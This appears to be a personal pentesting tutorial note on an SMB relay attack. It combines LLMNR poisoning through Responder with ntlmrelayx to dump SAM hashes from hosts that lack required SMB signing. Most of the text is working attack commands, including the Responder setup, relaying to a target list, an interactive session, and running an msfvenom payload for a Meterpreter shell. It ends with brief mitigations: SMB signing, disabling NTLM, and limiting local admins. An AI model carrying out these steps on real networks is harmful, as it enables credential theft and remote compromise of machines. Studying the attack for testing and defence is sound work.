SMB Relay attack
In this attack we utilize llmnr poisoning and then use the captured hashes to dump sensitive critical information on other machines in the network.We utilize responder and ntlmrelay tool. Requirement for this is that smb signing must be disabled on target and the hash of the user which we captured,must be admin on the target machine.

    We need to narrow down all the targets which have smb signing disabled or enabled but are not required for logging in.

    nmap --script=smb2-security-mode.nse -p445

    Edit the /etc/responder/Responder.conf file to disable smb and http flags to off

    run responder

    responder -I interface -rdw

    now run ntlmrelay

    ntlmrelayx.py -tf targetlist.txt -smb2support

    Now any user must cause the llmnr attack and our smb relay attack will work

    We will receive SAM hashes and hives etc.

                OR

when running ntlm relay we can specify -i flag to get a interactive session.Then we nc into that specific local port and get bunch of feauturs.

    ntlmrelayx.py -tf targetlist.txt -smb2support -i

We can also specify -e to execute an executable when succesful.We can create a msfvenom exe payload and and specify that and get a meterpreter shell or any common shell

    ntlmrelayx.py -tf targetlist.txt -smb2support -e shell.exe

Mitigation:

    enable smb signing on every device across the network
    Disable ntlm authentication on the network(kerberos more secure)
    Limit local administrators across the network(a admin of single workstation is also admin of many other workstations which allows this attack)
